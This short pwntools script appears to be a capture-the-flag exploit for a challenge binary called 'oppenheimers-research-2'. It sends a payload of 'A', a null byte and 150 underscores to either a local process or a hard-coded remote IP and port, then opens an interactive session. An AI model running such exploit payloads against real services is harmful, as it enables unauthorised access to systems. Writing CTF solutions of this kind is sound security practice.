from pwn import *

if args.REMOTE:
    host = "34.75.76.65"
    port = 9003
    p = remote(host, port)
else:
    p = process("./static/oppenheimers-research-2")
p.sendline(b'A\x00' + b'_' * 150)
p.interactive()